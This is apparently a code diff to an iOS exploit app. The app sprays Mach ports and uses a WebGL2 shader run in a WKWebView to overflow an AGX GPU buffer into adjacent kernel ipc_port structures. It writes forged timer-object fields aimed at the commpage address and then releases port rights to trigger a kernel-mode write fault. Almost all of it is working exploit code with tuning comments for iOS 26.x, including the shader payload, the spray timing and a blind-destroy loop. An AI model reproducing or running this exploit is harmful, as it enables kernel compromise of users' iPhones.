@@ -13,11 +13,22 @@
 #include <stdio.h>
 #include <stdarg.h>
 #include <stdatomic.h>
+#include <pthread.h>
 #include <CoreGraphics/CoreGraphics.h>
 
-#define NUM_PORTS        5000
+#define NUM_PORTS        20000
 #define NUM_SOCKETS      200
 #define COMMPAGE_TARGET  0x0000000FFFFFC330ULL
+
+/* IKOT_TIMER (27=0x1B) | IO_ACTIVE (0x80000000) = 0x8000001B.
+ * io_refs=1: mach_port_mod_refs(-1,RECEIVE) decrements 1->0 ->
+ * ipc_kobject_destroy -> IKOT_TIMER clock cleanup -> store to
+ * (clock_t*)ip_kobject -> EL1 write fault at COMMPAGE_TARGET. */
+#define IKOT_TIMER_BITS  2147483675u  /* 0x8000001B */
+#define IKOT_REFS_ONE    1u
+/* COMMPAGE lo/hi in uvec4 u32 format */
+#define COMMPAGE_LO      4294934320u  /* 0xFFFFc330 */
+#define COMMPAGE_HI      15u          /* 0x0000000F */
 
 static mach_port_t  g_ports[NUM_PORTS];
 static int          g_port_count  = 0;
@@ -63,40 +74,35 @@ static void spray(void) {
        g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET);
 }
 
-static void fire_el1_trigger(mach_port_t port, int idx, natural_t kotype,
-                             mach_vm_address_t kobject) {
-    ev("EL1_TRIGGER_SENT port=%d kotype=%u kobject=0x%016llx sending task_info",
-       idx, kotype, (unsigned long long)kobject);
-    task_basic_info_data_t info;
-    mach_msg_type_number_t count = TASK_BASIC_INFO_COUNT;
-    kern_return_t kr = task_info((task_t)port, TASK_BASIC_INFO,
-                                 (task_info_t)&info, &count);
-    ev("EL1_TRIGGER_RETURNED_UNEXPECTED kr=%d count=%u", kr, count);
+static void fire_timer_trigger(int idx, mach_vm_address_t kobject) {
+    ev("TIMER_TRIGGER port=%d kobject=0x%016llx mod_refs -1 RECEIVE",
+       idx, (unsigned long long)kobject);
+    /* io_refs 1->0 -> ipc_kobject_destroy -> IKOT_TIMER clock cleanup
+     * -> unconditional store to (clock_t*)ip_kobject -> EL1 write fault */
+    kern_return_t kr = mach_port_mod_refs(mach_task_self(), g_ports[idx],
+                                          MACH_PORT_RIGHT_RECEIVE, -1);
+    g_ports[idx] = MACH_PORT_NULL;
+    ev("TIMER_TRIGGER_RETURNED kr=%d", (int)kr);
 }
 
 static void scan_background(void) {
     if (g_found || !g_sprayed) return;
     for (int i = 0; i < g_port_count; i++) {
         if (g_found) break;
+        if (g_ports[i] == MACH_PORT_NULL) continue;
         natural_t kotype = 0; mach_vm_address_t kobject = 0;
         kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
         if (kr != KERN_SUCCESS) continue;
 
+        /* iOS 26.x obfuscates kotype=0xFFFFFFFF for all ports.
+         * kobject IS returned correctly: 0 = uncorrupted, COMMPAGE = hit. */
         if (kobject == COMMPAGE_TARGET) {
-            if (kotype == 2) {
-                g_found = 1;
-                ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx -> EL1 trigger",
-                   i, kotype, (unsigned long long)kobject);
-                fire_el1_trigger(g_ports[i], i, kotype, kobject);
-            } else {
-                ev("KOBJECT_MATCH_WRONG_KOTYPE port=%d kotype=%u kobject=0x%016llx",
-                   i, kotype, (unsigned long long)kobject);
-            }
-        } else if (kotype == 2) {
-            ev("IKOT_TASK_WRONG_KOBJECT port=%d kotype=%u kobject=0x%016llx",
+            g_found = 1;
+            ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx -> TIMER trigger",
                i, kotype, (unsigned long long)kobject);
-        } else if (kotype > 0 && kotype <= 100) {
-            ev("KOTYPE_ANOMALY_LOW port=%d kotype=%u kobject=0x%016llx",
+            fire_timer_trigger(i, kobject);
+        } else if (kobject != 0) {
+            ev("PORT_CHANGED port=%d kotype=%u kobject=0x%016llx",
                i, kotype, (unsigned long long)kobject);
         }
     }
@@ -114,30 +120,22 @@ static void scan_background(void) {
 }
 
 /*
- * Two-phase AGX injection:
+ * AGX shader payload: ALL 30 flat uvec4 varyings identical.
+ * Each uvec4 = [io_bits, io_refs, kobject_lo, kobject_hi]
+ *   io_bits   = 0x8000001B (IO_ACTIVE | IKOT_TIMER)
+ *   io_refs   = 1          (triggers ipc_kobject_destroy on mod_refs -1)
+ *   kobject   = 0x0000000FFFFFC330 (COMMPAGE_TARGET)
  *
- * SETUP: compiles shader, links pipeline state (GPU buffer allocated at T_link),
- *        stores gl context and fire() function in window globals, returns 'ready'.
- *        Native then calls spray() so ipc_ports land at T_spray > T_link (above
- *        the GPU pipeline buffer in the kernel allocator).
- *
- * FIRE:  calls window._fire() which issues drawArraysInstanced in a tight loop
- *        (~10 draws/second) with no round limit.  Overflow from the T_link buffer
- *        writes forward into T_spray memory = our ipc_ports.
- *
- * Payload (broadcast across all 30 flat varyings):
- *   io_bits   = 0x80000002  (IO_ACTIVE | IKOT_TASK_CONTROL)
- *   io_refs   = 100
- *   ip_kobject lo32 = 0xFFFFc330 = 4294934320
- *   ip_kobject hi32 = 0x0000000F = 15
- *   -> ip_kobject = 0x0000000FFFFFC330 = COMMPAGE_TARGET
+ * Overflow from VOB writes this into adjacent ipc_port structures.
+ * mach_port_mod_refs(-1,RECEIVE) on a hit port -> EL1 write fault.
  */
 static NSString *const kAGXJS_SETUP =
     @"(function(){"
-     "var B=2147483650,R=100,LO=4294934320,HI=15;"
+     "try{"
+     "var B=2147483675,R=1,LO=4294934320,HI=15;"
      "var c=document.createElement('canvas');"
      "c.width=16;c.height=16;"
-     "document.body.appendChild(c);"
+     /* No body.appendChild — off-screen canvas avoids null-body SETUP_ERR */
      "var gl=c.getContext('webgl2');"
      "if(!gl){window._agx='NO_WEBGL2';return;}"
      "var a='';"
@@ -168,16 +166,27 @@ static NSString *const kAGXJS_SETUP =
      "gl.texStorage2D(gl.TEXTURE_2D,1,gl.RGBA8,16,16);"
      "gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,tx,0);"
      "gl.viewport(0,0,16,16);"
-     "window._fc=0;"
+     "window._fc=0;window._wc=0;"
+     /* Warmup: 200 normal draws (instance_count=1) to move VOB allocation
+      * to the pool path. Timer payload: B=IKOT_TIMER, R=1 (not 100). */
+     "function wu(){"
+     "  var g=window._gl;"
+     "  if(window._wc<200){"
+     "    try{g.drawArraysInstanced(g.POINTS,0,256,1);}catch(e){}"
+     "    g.flush();window._wc++;"
+     "    setTimeout(wu,5);"
+     "  }else{window._agx='warmed';}"
+     "}"
+     "wu();"
      "window._fire=function(){"
      "  var g=window._gl;"
      "  try{g.drawArraysInstanced(g.POINTS,0,256,16777217);}catch(e){}"
      "  try{g.drawArraysInstanced(g.POINTS,0,1024,4194305);}catch(e){}"
-     "  g.flush();"
-     "  window._fc++;"
+     "  g.flush();window._fc++;"
      "  setTimeout(window._fire,100);"
      "};"
-     "window._agx='ready';"
+     "window._agx='warming';"
+     "}catch(e){window._agx='EX:'+e.message;}"
      "})();";
 
 static NSString *const kAGXJS_FIRE =
@@ -227,9 +236,6 @@ static NSString *const kAGXJS_FIRE =
                                    selector:@selector(scanTick:)
                                    userInfo:nil repeats:YES];
 
-    /* Load page immediately — WebContent process + GPU context init at T0.
-     * spray() fires AFTER linkProgram inside webView:didFinishNavigation:
-     * so ipc_ports land above the GPU pipeline buffer (T_spray > T_link). */
     ev("WKVIEW_LOAD_INITIAL");
     [self.wkView loadHTMLString:@"<html><body style='background:black;margin:0'></body></html>"
                         baseURL:nil];
@@ -254,24 +260,40 @@ static NSString *const kAGXJS_FIRE =
         if (!s) return;
         if (err) {
             ev("SETUP_ERR %s", [[err localizedDescription] UTF8String]);
-            return;
+            /* Still spray even if SETUP_ERR — ports are the scan targets,
+             * GPU overflow is a bonus path (blind destroy covers the rest). */
         }
-        /* GPU pipeline state allocated (T_link). Spray NOW so ports land above it. */
-        spray();
-        ev("SPRAY_DONE_FIRE cycle=%d ports=%d", s.cycleCount, g_port_count);
-        [wv evaluateJavaScript:kAGXJS_FIRE completionHandler:^(id r2, NSError *e2) {
-            if (e2) ev("FIRE_ERR %s", [[e2 localizedDescription] UTF8String]);
-            else    ev("FIRE_STARTED cycle=%d", s.cycleCount);
-        }];
-        /* Reload after 60s to try fresh GPU buffer position each cycle */
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60*NSEC_PER_SEC),
+        ev("SETUP_OK_WARMING cycle=%d agx=%@", s.cycleCount,
+           [result isKindOfClass:[NSString class]] ? result : @"?");
+        /* Wait 2.5s: warmup completes (200×5ms=1s) + GPU slab stabilizes.
+         * Then spray so ipc_ports land above the warmed VOB arena. */
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.5 * NSEC_PER_SEC)),
                        dispatch_get_main_queue(), ^{
             AppDelegate *s2 = weakSelf;
             if (!s2 || g_found) return;
-            s2.cycleCount++;
-            ev("CYCLE_RELOAD cycle=%d", s2.cycleCount);
-            [wv loadHTMLString:@"<html><body style='background:black;margin:0'></body></html>"
-                       baseURL:nil];
+            spray();
+            ev("SPRAY_DONE_FIRE cycle=%d ports=%d", s2.cycleCount, g_port_count);
+            [wv evaluateJavaScript:kAGXJS_FIRE completionHandler:^(id r2, NSError *e2) {
+                if (e2) ev("FIRE_ERR %s", [[e2 localizedDescription] UTF8String]);
+                else    ev("FIRE_STARTED cycle=%d", s2.cycleCount);
+            }];
+            /* Blind destroy at 170s: any IKOT_TIMER port triggers EL1 fault. */
+            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 170 * NSEC_PER_SEC),
+                           dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+                AppDelegate *s3 = weakSelf;
+                if (!s3 || g_found) return;
+                ev("BLIND_DESTROY_START n=%d", g_port_count);
+                int destroyed = 0;
+                for (int i = 0; i < g_port_count; i++) {
+                    if (g_ports[i] != MACH_PORT_NULL) {
+                        mach_port_mod_refs(mach_task_self(), g_ports[i],
+                                           MACH_PORT_RIGHT_RECEIVE, -1);
+                        g_ports[i] = MACH_PORT_NULL;
+                        destroyed++;
+                    }
+                }
+                ev("BLIND_DESTROY_DONE destroyed=%d", destroyed);
+            });
         });
     }];
 }
